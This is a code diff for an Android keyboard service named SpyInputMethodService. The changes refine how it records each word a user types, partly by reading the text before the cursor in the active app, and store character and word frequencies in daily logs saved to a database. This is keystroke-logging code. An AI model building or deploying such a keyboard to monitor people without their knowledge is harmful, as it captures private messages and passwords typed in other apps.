@@ -8,6 +8,7 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
+import android.widget.Toast;
 
 import com.idankorenisraeli.spyboard.common.TimeManager;
 import com.idankorenisraeli.spyboard.data.DailyUsageLog;
@@ -29,15 +30,17 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     boolean hebrewMode = false;
     boolean symbol = false;
 
+
     Keyboard engKeyboard, hebKeyboard, symbolKeyboard;
 
     String currentDate;
     DailyUsageLog dailyLog;
     UsageLog sessionUsageLog;
 
-    private static final int AVG_WORD_LENGTH = 16;
 
-    StringBuilder currentWord = new StringBuilder(AVG_WORD_LENGTH);
+    private static final int WORD_EST_LENGTH = 16; // size of new sb for better performance
+    StringBuilder lastWordBuilder = new StringBuilder(WORD_EST_LENGTH); //Saving the last word user typed
+
 
     DatabaseManager databaseManager;
 
@@ -78,8 +81,10 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
             public void onDailyLogLoaded(DailyUsageLog loadedLog) {
                 if (loadedLog != null)
                     dailyLog = loadedLog;
-                else
+                else {
                     dailyLog = new DailyUsageLog();
+                    Toast.makeText(SpyInputMethodService.this, "New Log " + currentDate.toString() , Toast.LENGTH_SHORT).show();
+                }
             }
         });
     }
@@ -105,9 +110,8 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         if (TextUtils.isEmpty(selectedText)) {
             // no selection, so delete previous character
             ic.deleteSurroundingText(1, 0);
-            if (currentWord.length() > 0) {
-                currentWord.deleteCharAt(currentWord.length() - 1);
-            }
+            if (lastWordBuilder.length() > 0)
+                lastWordBuilder.deleteCharAt(lastWordBuilder.length() - 1);
         } else {
             // delete the selection
             ic.commitText("", 1);
@@ -127,28 +131,60 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         String typed = codeToString(primaryCode);
         ic.commitText(typed, 1); //writing to screen
 
+        if (keyboardView.isShifted())
+            shiftAction();
+
         trackKeyPress(typed);
     }
 
 
     private void trackKeyPress(String typed) {
         if (sessionUsageLog != null) {
-
             if (typed.equals(" ")) {
-                trackWord();
+                trackWordByCursor();
+                lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
                 //reset the strbuilder
             } else {
-                currentWord.append(typed); //Calculating the word by adding char by char
                 sessionUsageLog.addChar(typed); //Adding to single chars map
+                lastWordBuilder.append(typed);
             }
         }
     }
 
-    private void trackWord() {
-        if (currentWord.length() > 0) {
-            sessionUsageLog.addWord(currentWord.toString());
-            currentWord = new StringBuilder(AVG_WORD_LENGTH);
-        }
+
+    /**
+     * This method will use the pointer of the keyboard
+     * to detect the last word.
+     * most of the times it will be enough to get the last word accurately.
+     * but when user click on something that is out of the keyboard like a send button
+     * we need to get the last word with the builder
+     */
+    private void trackWordByCursor() {
+        String word;
+        InputConnection ic = getCurrentInputConnection();
+        word = (String) ic.getTextBeforeCursor(64, 0);
+        if (word == null || word.length() <= 1)
+            return; //No last word, just a space
+
+        if (word.charAt(word.length() - 1) == ' ')
+            word = word.substring(0, word.length() - 1); //delete space after word
+
+        int lastSpaceIndex = word.lastIndexOf(' ') + 1; //delete space before word
+        word = word.substring(lastSpaceIndex);
+
+
+        sessionUsageLog.addWord(word);
+    }
+
+    /**
+     * In case of when user presses on "send" button
+     * or something similar which is outside of the keyboard
+     * we will track the last word by the builder
+     */
+    private void trackWordByBuilder(){
+        if (lastWordBuilder.length() > 0)
+            sessionUsageLog.addWord(lastWordBuilder.toString());
+        lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
     }
 
     private String codeToString(int primaryCode) {
@@ -186,7 +222,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
             InputConnection ic = getCurrentInputConnection();
             if (ic == null) return;
             if (!isTextBefore()) {
-                trackWord();
+                trackWordByCursor();
             }
             switch (primaryCode) {
                 case Keyboard.KEYCODE_DELETE:
@@ -260,6 +296,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         if (!currentDate.equals(TimeManager.getInstance().getDateOfToday())) {
             // new day
             endInputSession(); //restart the current session
+            currentDate = TimeManager.getInstance().getDateOfToday();
             dailyLog = new DailyUsageLog(); //restart the daily log
         }
 
@@ -270,8 +307,15 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     @Override
     public void onStartInput(EditorInfo attribute, boolean restarting) {
         super.onStartInput(attribute, restarting);
-        Log.i("pttt", "onStartInput");
+
+
+        if (keyboardView != null && keyboardView.isShifted())
+            shiftAction();
+
+        if (symbol)
+            symbolAction();
     }
+
 
     @Override
     public void onFinishInputView(boolean finishingInput) {
@@ -280,20 +324,39 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         endInputSession();
 
         if (dailyLog != null) {
+            Log.i("pttt", "Saving daily with " + dailyLog.getWordFreq().size() + " words");
             databaseManager.saveDailyLog(dailyLog);
             //Saving into database
         }
     }
 
+
+    @Override
+    public void onWindowShown() {
+        // This method calls when keyboard pops up and when user press send/enter in outer app
+        trackWordByBuilder();
+        super.onWindowShown();
+    }
+
+    @Override
+    public void onWindowHidden() {
+        super.onWindowHidden();
+    }
+
+
     private void endInputSession() {
-        if (currentWord != null) {
-            trackWord();
-        }
+        trackWordByBuilder();
         //Adding the last word written in this session
+        //Here we cannot use the cursor cause message might have been alrady sent
 
         Log.i("pttt", "Words:" + sessionUsageLog.getWordFreq());
-        dailyLog.addLog(sessionUsageLog);
+        if (dailyLog != null)
+            dailyLog.addLog(sessionUsageLog);
+        else
+            Log.i("pttt", "DailyLog is null");
         //Adding the session data that is finished to the day's total
+
+        Log.i("pttt", "Date: " + currentDate);
 
         sessionUsageLog = new UsageLog();
         // New keyboard usage
